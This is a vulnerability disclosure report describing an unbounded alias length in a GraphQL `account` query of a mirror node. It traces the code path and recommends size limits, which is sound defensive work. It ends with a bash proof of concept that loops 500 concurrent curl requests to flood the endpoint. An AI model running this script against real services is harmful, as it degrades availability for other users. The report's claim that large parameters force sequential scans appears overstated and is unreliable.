### Title
Unbounded Alias Length in GraphQL `account` Query Enables Unauthenticated Resource Exhaustion DoS

### Summary
The `alias` field in `AccountInput` is validated only by a character-set regex (`^[A-Z2-7]+$`) with no maximum length constraint. An unauthenticated attacker can submit an arbitrarily long (e.g., 10,000-character) Base32 string that passes validation, is decoded into a ~6,250-byte array by `decodeBase32`, and is then passed directly as a parameter to a PostgreSQL query against the indexed `alias` column — causing CPU overhead and potential index bypass (sequential scan) on every request.

### Finding Description

**Exact code path:**

1. **Schema** — `graphql/src/main/resources/graphql/account.graphqls`, line 90:
   ```graphql
   alias: String @Pattern(regexp: "^[A-Z2-7]+$")
   ```
   Only the Base32 character set is validated. No `@Size` or length constraint exists.

2. **Controller** — `graphql/src/main/java/org/hiero/mirror/graphql/controller/AccountController.java`, lines 47–48:
   ```java
   if (alias != null) {
       return entityService.getByAliasAndType(alias, EntityType.ACCOUNT).map(accountMapper::map);
   }
   ```
   The raw, unbounded alias string is forwarded directly to the service.

3. **Service** — `graphql/src/main/java/org/hiero/mirror/graphql/service/EntityServiceImpl.java`, line 30:
   ```java
   return entityRepository.findByAlias(decodeBase32(alias)).filter(e -> e.getType() == type);
   ```
   `decodeBase32` (in `GraphQlUtils.java`, line 84) calls `BASE32.decode(base32)` with no length guard, producing a byte array proportional to the input length.

4. **Repository** — `graphql/src/main/java/org/hiero/mirror/graphql/repository/EntityRepository.java`, lines 13–14:
   ```java
   @Query(value = "select * from entity where alias = ?1 and deleted is not true", nativeQuery = true)
   Optional<Entity> findByAlias(byte[] alias);
   ```
   The decoded byte array is sent as a parameter to PostgreSQL.

**Root cause:** The `@Pattern` annotation validates only the character set of the alias, not its length. No `@Size(max = N)` or equivalent constraint is applied anywhere in the GraphQL input processing chain.

**Why existing checks fail:** The `@Valid` annotation on `AccountController.account()` triggers Jakarta Bean Validation, which enforces `@Pattern(regexp: "^[A-Z2-7]+$")`. A 10,000-character string of `A`s satisfies this regex perfectly and passes validation. The `decodeBase32` utility and `findByAlias` repository method impose no length checks of their own.

**Contrast with other subsystems:** The REST-Java layer (`EntityIdAliasParameter.java`, line 13) explicitly limits alias to 40–70 characters via `[A-Z2-7]{40,70}`. The OpenAPI spec uses a pattern that implicitly bounds alias length to valid Base32 groups. The GraphQL layer has no equivalent bound.

### Impact Explanation

A 10,000-character Base32 string decodes to approximately 6,250 bytes. PostgreSQL's btree index has a maximum entry size of roughly 2,712 bytes (1/3 of an 8 KB page). A 6,250-byte parameter exceeds this limit, causing the query planner to either error or fall back to a full sequential scan of the `entity` table on every such request. Even without a sequential scan, each request incurs: HTTP parsing, regex evaluation, Base32 decoding of 10,000 characters (CPU), and a DB round-trip with a 6,250-byte parameter. Flooding the endpoint with concurrent requests amplifies this into sustained CPU and database connection pool exhaustion, degrading availability for all users of the mirror node GraphQL API.

### Likelihood Explanation

No authentication or special privilege is required. The GraphQL endpoint is publicly exposed. The exploit requires only a standard HTTP client and knowledge of the GraphQL schema (which is introspectable by default). The attack is trivially scriptable, repeatable at high frequency, and requires no state. Any attacker with network access to the GraphQL endpoint can execute it.

### Recommendation

Add a `@Size(max = 100)` constraint (or equivalent) to the `alias` field in `AccountInput` in `account.graphqls`, consistent with the 40–70 character bound enforced by the REST-Java layer. Additionally, add a length guard in `GraphQlUtils.decodeBase32` or `EntityServiceImpl.getByAliasAndType` to reject inputs exceeding the maximum valid alias length before any decoding or DB interaction occurs. Consider also enforcing a global GraphQL request size limit at the HTTP layer.

### Proof of Concept

```bash
# Generate a 10,000-character valid Base32 string
ALIAS=$(python3 -c "print('A' * 10000)")

# Send the query to the GraphQL endpoint (no authentication required)
curl -s -X POST https://<mirror-node-host>/graphql/alpha \
  -H 'Content-Type: application/json' \
  -d "{\"query\": \"{ account(input: { alias: \\\"${ALIAS}\\\" }) { entityId { num } } }\"}"

# Repeat in a loop to amplify load
for i in $(seq 1 500); do
  curl -s -X POST https://<mirror-node-host>/graphql/alpha \
    -H 'Content-Type: application/json' \
    -d "{\"query\": \"{ account(input: { alias: \\\"${ALIAS}\\\" }) { entityId { num } } }\"}" &
done
wait
```

**Expected result:** Each request passes `@Pattern` validation, triggers `BASE32.decode` on 10,000 characters, and executes `SELECT * FROM entity WHERE alias = $1 AND deleted IS NOT TRUE` with a ~6,250-byte parameter — causing index bypass and/or sequential table scans under concurrent load.
